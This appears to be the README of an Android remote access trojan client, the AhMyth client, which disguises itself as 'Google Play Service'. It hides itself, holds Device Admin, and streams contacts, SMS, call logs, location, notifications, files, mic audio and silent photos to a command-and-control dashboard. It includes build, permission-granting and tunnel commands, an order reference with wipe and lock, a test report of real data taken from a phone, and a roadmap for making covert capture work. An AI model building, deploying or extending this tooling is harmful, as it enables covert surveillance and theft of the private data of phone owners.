# AhMyth Client (named "Google Play Service")

A remote administration tool (RAT) **client** for Android, designed to operate as a
persistent background service. It uses Socket.IO for real-time, bidirectional
communication with a command-and-control (C2) server and implements a modular
"Manager" pattern for remote tasks.

> **Disclaimer:** This project exists for educational and authorized testing
> purposes only — testing on hardware you own, security research, and defensive
> analysis. Unauthorized access to computers or mobile devices is illegal. The
> developers assume no liability for misuse.

---

## Table of contents

- [What's in this repo](#whats-in-this-repo)
- [Feature matrix](#feature-matrix)
- [Quickstart](#quickstart)
- [Per-run configuration (no rebuild)](#per-run-configuration-no-rebuild)
- [Testing on the emulator](#testing-on-the-emulator)
- [Testing on a physical device (wireless adb)](#testing-on-a-physical-device-wireless-adb)
- [The mock C2 dashboard](#the-mock-c2-dashboard)
- [Order reference](#order-reference)
- [Response capture & downloads](#response-capture--downloads)
- [Known limitations](#known-limitations)
- [Test report — vivo V2538 (Android 16)](#test-report--vivo-v2538-android-16)
- [Roadmap & TODO](#roadmap--todo)
- [Removing the app from a device](#removing-the-app-from-a-device)
- [Development & tests](#development--tests)

---

## What's in this repo

| Component | Role |
|---|---|
| `MainActivity` | Entry point; requests permissions (Camera, Location, SMS, …), enables **Device Admin**, then starts the background service and hides its presence. |
| `MainService` | A foreground service that keeps the process alive (shows a "Google Play Service" notification) and starts the socket connection. |
| `ConnectionManager` | The command hub. Listens for `order` Socket.IO events and dispatches them to the specialized manager classes. |
| `IOSocket` | Owns the Socket.IO connection (socket.io-client-java 2.0.1) and registers device identity (model, manufacturer, Android version, device id). |
| `C2Config` | **Runtime per-run configuration** — lets you change the server URL / device id without rebuilding. See below. |
| `helpers/*` | `FileManager`, `CameraManager`, `MicManager`, `LocManager`, `SMSManager`, `CallsManager`, `ContactsManager`, `AppsListManager`, `ScreenManager`. |
| `NotificationService` | A notification **listener** that pushes incoming notifications to the C2 continuously (no order required). |
| `MyReceiver` / `RestartServiceWorker` | Restart the service after reboot. |
| `tools/mock_c2_test_client.py` | A zero-dependency **mock C2 server + web dashboard** for behavioral analysis on hardware you own. |
| `tools/c2_config.template.json` | Template for the per-run runtime config pushed to the device. |

---

## Feature matrix

| Order | Functionality |
|---|---|
| File Manager | List directories, download files, delete files/folders remotely |
| Camera | Enumerate cameras, capture photos **with no UI** (front/back) |
| Microphone | Record audio for a specified duration |
| Location | Real-time GPS fix: lat/lng + **provider, accuracy, altitude, fix time** |
| SMS | Read the full inbox, send new SMS |
| Calls | Read call logs, initiate remote calls |
| Contacts | Dump the full contact list |
| Apps | List installed apps, **launch any app** (`run-app`) |
| System | Wipe data, lock device, reboot, open URLs (requires Device Admin) |
| Notifications | Stream device notifications to the C2 automatically (on by default) |

---

## Quickstart

Requirements: JDK 17, Android SDK (compileSdk 34), a device or AVD.

```bash
# 1. Build the debug APK
export JAVA_HOME=/opt/android-studio/jbr     # wherever your JDK lives
export ANDROID_HOME=$HOME/Android/Sdk
./gradlew :app:assembleDebug

# 2. Start the mock C2 (terminal console + web dashboard)
python3 tools/mock_c2_test_client.py --port 42474
#    dashboard:  http://127.0.0.1:42474/

# 3. Install the APK on your device/AVD
adb install -r app/build/outputs/apk/debug/app-debug.apk
```

The mock server is a full stand-in for the C2 side: it speaks the same
Engine.IO v4 / Socket.IO protocol the app uses, registers every connecting
device, streams orders to it, prints responses, and **saves every response to
disk** (see [Response capture](#response-capture--downloads)).

The helper script `tools/run_mock_c2.sh` restarts the server detached with a
FIFO (`/tmp/c2in`) so you can drive orders from any shell:

```bash
./tools/run_mock_c2.sh            # start (logs to /tmp/mock_c2.log)
echo 'apps' > /tmp/c2in           # send any order
tail -f /tmp/mock_c2.log          # watch responses
```

---

## Per-run configuration (no rebuild)

The server URL and device id are **no longer hardcoded**. `IOSocket` reads a
runtime config file on every process start via `C2Config`:

```bash
adb push tools/c2_config.template.json /sdcard/Download/c2_config.json
```

The file looks like this (edit per run):

```json
{
  "url": "http://127.0.0.1:42474",
  "device_id": "my-test-device"
}
```

- `url` — overrides the build-time `SOCKET_URL`. A missing scheme gets
  `http://` prepended. Examples: `http://10.0.2.2:42474` (emulator host
  alias), `http://192.168.0.108:42474` (LAN), `http://127.0.0.1:42474`
  (physical device behind an `adb reverse` tunnel).
- `device_id` — replaces the Android ID in the registration query string, so
  the mock C2 (and its download folders) can tell runs apart.

Checked locations, in order (first file found wins):

1. App-specific external dir: `/sdcard/Android/data/com.android.background.services/files/c2_config.json`
2. `/sdcard/Download/c2_config.json`
3. `/sdcard/c2_config.json`

Missing file, missing keys, or malformed JSON fall back to the build-time
defaults, so a plain build behaves exactly as before. Config changes apply on
the **next process start** (force-stop + relaunch, or reboot).

> Why `127.0.0.1` for a physical phone? Because the transport of choice is an
> `adb reverse` tunnel — see below. This also keeps the dashboard local-only.

---

## Testing on the emulator

```bash
# Boot an AVD (KVM makes this fast)
$ANDROID_HOME/emulator/emulator -avd Medium_Phone -no-snapshot &

# Point the config at the emulator's host alias (10.0.2.2 = your machine)
echo '{ "url": "http://10.0.2.2:42474", "device_id": "emu-01" }' \
  > /tmp/c2_config.json
adb push /tmp/c2_config.json /sdcard/Download/c2_config.json

# Install, launch, watch it register on the mock C2 dashboard
adb install -r app/build/outputs/apk/debug/app-debug.apk
adb shell am start -n com.android.background.services/.MainActivity
```

The app needs a pile of permissions to do anything interesting. On a
provisioned AVD you can pre-grant them (this mirrors what the app requests):

```bash
PKG=com.android.background.services
adb shell pm grant $PKG android.permission.READ_CONTACTS
adb shell pm grant $PKG android.permission.READ_CALL_LOG
adb shell pm grant $PKG android.permission.READ_SMS
adb shell pm grant $PKG android.permission.ACCESS_FINE_LOCATION
adb shell pm grant $PKG android.permission.CAMERA
adb shell pm grant $PKG android.permission.RECORD_AUDIO
adb shell pm grant $PKG android.permission.READ_EXTERNAL_STORAGE
adb shell appops set $PKG android:write_settings allow
adb shell appops set $PKG MANAGE_EXTERNAL_STORAGE allow
adb shell dumpsys deviceidle whitelist +$PKG
```

---

## Testing on a physical device (wireless adb)

The machine and the phone must be on the same Wi-Fi network.

```bash
# 1. Pair (values from Settings > Developer options > Wireless debugging)
export PATH=$PATH:$HOME/Android/Sdk/platform-tools
adb pair 192.168.0.XXX:PORT      # enter the 6-digit code when prompted
adb connect 192.168.0.XXX:PORT

# 2. Install the APK (allow "Install unknown apps"; Play Protect may warn)
adb install -r app/build/outputs/apk/debug/app-debug.apk

# 3. Tunnel the phone's localhost:42474 straight to the mock C2 on this machine
adb reverse tcp:42474 tcp:42474

# 4. Point the runtime config at the tunnel, relaunch
echo '{ "url": "http://127.0.0.1:42474", "device_id": "vivo-01" }' \
  > /tmp/c2_config.json
adb push /tmp/c2_config.json /sdcard/Download/c2_config.json
adb shell am start -n com.android.background.services/.MainActivity
```

The `adb reverse` tunnel is the key trick when Wi-Fi client isolation blocks
the phone from reaching your machine directly — it rides the working adb
connection. The tunnel dies with the wireless adb session; re-run step 3 to
restore it.

---

## The mock C2 dashboard

Open **http://127.0.0.1:42474/** in your browser.

- **Device cards** — every connected device with model / manufacturer /
  Android version / device id. **Click a card to target that device**, then use
  the order buttons.
- **Order buttons** — one-tap `apps`, `cn`, `cl`, `sms`, `ca`, `lm`, `sc`,
  `photo-back` (`cam-on 1`), `photo-front` (`cam-on 0`).
- **Raw order box** — parameterized orders: `mc 5`, `fm-ls /storage/emulated/0`,
  `fm-dl <path>`, `run-app com.android.settings`, `sms-send <to> <text>`, or
  arbitrary `raw {"order":"..."}` payloads.
- **Downloads panel** — every captured response, listed newest-first, click to
  download the `.json` or readable `.txt`.
- **Live log** — orders sent, responses received, heartbeats, connection
  events, color-coded and streaming in real time.

API (handy for scripting):

| Endpoint | Description |
|---|---|
| `GET /api/devices` | JSON list of connected devices |
| `POST /api/order` | `{"order":"lm","target":"<sid>"}` — send an order |
| `GET /api/log?since=N` | New log lines since index N |
| `GET /api/files` | JSON list of captured response files |
| `GET /files/<device>/<name>` | Download a captured response |
| `GET /api/config-template` | The runtime config template |

---

## Order reference

| Command | Payload sent | Notes |
|---|---|---|
| `lm` | `{"order":"x0000lm"}` | lat/lng + provider/accuracy/altitude/time |
| `cn` | `{"order":"x0000cn"}` | contacts |
| `cl` | `{"order":"x0000cl"}` | call logs |
| `apps` | `{"order":"x0000apps"}` | installed apps |
| `sms` | `{"order":"x0000sm","extra":"ls"}` | SMS inbox |
| `sms-send <to> <text>` | `... "extra":"sendSMS"` | sends a real SMS |
| `ca` | `{"order":"x0000ca","extra":"camList"}` | camera list |
| `cam-on 1` / `cam-on 0` | `... "extra":"1"|"0"` | **silent photo** (back/front) |
| `sc` | `{"order":"x0000sc"}` | screen capture (needs the consent grant) |
| `mc <sec>` | `{"order":"x0000mc","sec":N}` | mic recording |
| `fm-ls <path>` | `... "extra":"ls"` | list directory |
| `fm-dl <path>` | `... "extra":"dl"` | download file |
| `delete <path>` | `{"order":"x0000deleteFF"}` | deletes on device |
| `run-app <pkg>` | `{"order":"x0000runApp"}` | launch any app |
| `open-url <url>` | `{"order":"x0000openUrl"}` | open a URL |
| `call <number>` | `{"order":"x0000dm"}` | dials a real number |
| `lock` / `wipe` / `reboot` | `x0000lockDevice` / `x0000wipeDevice` / `x0000rebootDevice` | real device actions |
| `raw <json>` | as given | arbitrary payload |

> ⚠️ `wipe`, `reboot`, `lock`, `delete`, `call`, `sms-send` and `fm-dl` are
> real actions on the target device. Only use them on hardware you own.

---

## Response capture & downloads

Every response the app emits is saved by the mock C2 under `--out`
(default `./c2_out`, gitignored):

```
c2_out/
  <device_id>/
    20260804-170101_x0000cn.json     # raw JSON (complete data)
    20260804-170101_x0000cn.txt      # readable text: name/number lines
    20260804-170102_x0000cl.json
    20260804-170102_x0000cl.txt
    ...
```

Readable `.txt` exports are generated for **contacts, call logs, SMS, and app
lists**; everything else is kept as raw `.json`. Browse and download them from
the dashboard's **Downloads** panel or `GET /files/<device>/<name>`.

---

## Known limitations

- **Android 14+ foreground-service rules.** As shipped, the app crashes on
  Android 14+ (`MissingForegroundServiceTypeException` / `SecurityException`).
  The manifest here has been fixed to `foregroundServiceType="specialUse"` —
  the only type with an auto-granted permission and no eligibility/timeout
  rules.
- **Camera indicator.** A silent photo still triggers Android 12+'s
  OS-level camera indicator dot in the status bar — no app can suppress it.
  The app itself shows no UI.
- **Binary payloads.** `MicManager`/`CameraManager` stuff raw `byte[]` into a
  `JSONObject`, which `org.json` stringifies to garbage — audio/photo bytes may
  be mangled in transit. Observed behavior, not fixed here.
- **Reconnection.** `reconnectionDelayMax=999999999` (~11.5 days) means a
  failed connect effectively never retries — restart the process to re-attach.
- **Notifications.** `NotificationService` streams device notifications to the
  C2 continuously, with no order needed. On anyone else's phone this is silent
  surveillance; disable/remove the listener when you're done testing.

### Verified on a physical device (vivo V2538, Android 16) — session findings

These were observed live during a full feature pass; see
[Test report](#test-report--vivo-v2538-android-16) for the complete matrix.

- **`cam-on` silent photo does not work on Android 16.** `CameraManager` uses
  the deprecated `android.hardware.Camera` API, which is dead on modern
  Android (returns `null` / throws). The handler swallows the exception, so the
  order goes out and **no response ever comes back** — a silent failure, not a
  crash. Needs a `Camera2` rewrite (see [Roadmap](#roadmap--todo)).
- **`sc` screen capture silently no-ops.** The app only requests
  MediaProjection consent when the user grants runtime permissions *through
  its in-app flow*. When permissions are pre-granted via `adb shell pm grant`
  (as the docs recommend), that code path never runs, no projection token is
  ever captured, and `x0000sc` returns nothing. On Android 14+ there is also an
  architectural conflict to verify: capture requires a `mediaProjection`
  foreground-service type, which the `specialUse` fix here removed.
- **Initial socket churn on reconnect.** The phone's socket session id churned
  every ~40–60 s for the first minutes after launch before settling; the app
  process itself stayed stable (verified via `pidof`). Worth investigating, not
  blocking.
- **Harness gap — binary responses are not saved.** `mc` (mic) and `fm-dl`
  (file download) arrive as Socket.IO binary events; the mock C2 logs them but
  **does not write the bytes to disk** like it does for JSON responses. Audio
  and file downloads are received but not capturable from the dashboard yet
  (see [Roadmap](#roadmap--todo)).
- **Untested by design.** The destructive orders (`lock`, `wipe`, `reboot`,
  `delete`, `sms-send`, `call`) were deliberately never fired during testing.

---

## Test report — vivo V2538 (Android 16)

Full feature pass driven through the mock C2 dashboard against a physical
phone (wireless adb + `adb reverse` tunnel, runtime config `device_id`
`vivo-test-01`). Recorded live.

| Order | Result | Evidence |
|---|---|---|
| `apps` | ✅ works | ~65 KB list; saved `.json` + readable `.txt` |
| `cn` (contacts) | ✅ works | ~188 KB; real names/numbers |
| `cl` (call log) | ✅ works | ~960 KB; real entries |
| `sms` (inbox) | ✅ works | ~546 KB; real messages |
| `ca` (camera list) | ✅ works | Back (id 0), Front (id 1) |
| `lm` (location) | ✅ works | **rich fix**: provider `network`, accuracy 15.1 m, altitude 471 m, epoch time |
| `fm-ls` | ✅ works | real directory listing incl. user files |
| `fm-dl` (download) | ⚠️ received | bytes arrive as a binary event; harness doesn't save them yet |
| `mc 5` (mic) | ⚠️ received | ~5 s recording arrives as a binary event; not saved yet |
| `cam-on` (photo) | ❌ fails | no response — deprecated `android.hardware.Camera` dead on Android 16 |
| `sc` (screen) | ❌ no-op | projection consent never granted; see Known limitations |
| `run-app com.android.settings` | ✅ works | `launchingStatus:true`; Settings opened on the phone |
| `open-url` | ✅ works | `status:true`; browser opened on the phone |
| notifications (`x0000nt`) | ✅ works | streams automatically; verified with an `adb`-posted test notification |
| heartbeat | ✅ works | `ping` → `pong` every ~10 s |
| runtime config override | ✅ works | phone registered as `vivo-test-01` (no rebuild) |

**Not tested** (destructive, skipped by choice): `lock`, `wipe`, `reboot`,
`delete`, `sms-send`, `call`.

---

## Roadmap & TODO

Prioritized backlog from this session. Feel free to pick any item.

- [ ] **Migrate `CameraManager` to Camera2** — replace the dead
  `android.hardware.Camera` API so `cam-on` works on Android 12+. Emit a proper
  binary/`base64` photo payload and make the mock C2 save it to disk.
- [ ] **Fix the `sc` screen-capture flow** — capture the MediaProjection token
  unconditionally at launch (not only via the in-app permission path), and
  resolve the Android 14+ `mediaProjection` FGS-type conflict with the
  `specialUse` manifest fix.
- [ ] **Harness: persist binary events** — save mic audio and downloaded files
  (bytes) under `c2_out/<device>/` and list them in the dashboard Downloads
  panel, like JSON responses already are.
- [ ] **Investigate reconnect churn** — pin down the initial ~40–60 s socket
  session-id churn on the phone and tune
  `reconnectionDelay*` so a transient network blip retries instead of waiting
  ~11.5 days.
- [ ] **Test `sc` end-to-end on a physical device** — relaunch the app without
  pre-granted permissions, tap through the in-app permission + screen-capture
  dialogs, then confirm a screenshot is captured.
- [ ] **Exercise destructive orders on hardware you own** — `lock`, `reboot`,
  `delete`, `sms-send`, `call` (skip `wipe` unless you truly want a factory
  reset) and record results in the test report.
- [ ] **More unit tests** — `C2Config` edge cases (malformed JSON, oversized
  file), plus tests for any new Camera2 / binary-capture code.
- [ ] **Per-device targeting on the dashboard** — search/filter devices, and
  show which orders each device has responded to.

---

## Removing the app from a device

1. **Remove Device Admin first**, or the app can block uninstall:
   Settings → Security → Device admin apps → deactivate "Google Play Service".
2. Uninstall: `adb uninstall com.android.background.services`, or long-press the
   icon → Uninstall.
3. Delete the pushed config: `adb shell rm /sdcard/Download/c2_config.json`.
4. If the notification listener is active, remove it from
   Settings → Apps → Special access → Notification access before uninstalling.

---

## Development & tests

Local JVM unit tests:

```bash
./gradlew :app:testDebugUnitTest
```

Tests cover `C2Config` (runtime config parsing/fallbacks) and `FileManager`
(size formatting). Instrumented tests (`androidTest`) require a device or AVD.
